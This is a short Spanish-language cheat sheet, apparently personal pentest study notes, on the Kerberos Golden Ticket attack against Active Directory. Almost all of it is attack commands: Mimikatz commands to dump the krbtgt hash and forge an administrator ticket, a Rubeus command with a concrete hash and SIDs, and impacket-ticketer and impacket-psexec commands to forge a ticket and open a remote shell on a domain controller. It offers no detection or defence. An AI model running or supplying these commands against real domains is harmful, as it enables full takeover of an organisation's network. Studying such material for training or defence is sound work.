# Golden Ticket Attack

- Cuando comprometemos la cuenta krbtgt, ya owneamos el dominio.
- Podemos solicitar acceso a cualquier recurso o sistema dentro del dominio.
- Golden tickets == Completar acceso a cualquier maquina.

## Mimikatz
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`
- Ahora generamos el golden ticket:
    - `kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:SID /krbtgt:NTLM /id:500 /ptt`
    - el `/id:500` significa el RID de administrador de maximos privilegios.
- `misc::cmd` para abrir un command prompt privilegiado

## Rubeus
- `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`

## Golden ticket con impacket
- `impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker`
- Exportamos la variable del ticket kerberos: `export KRB5CCNAME=hacker.ccache`
- Utilizamos psexec de impacket para entrar con este ticket `impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP`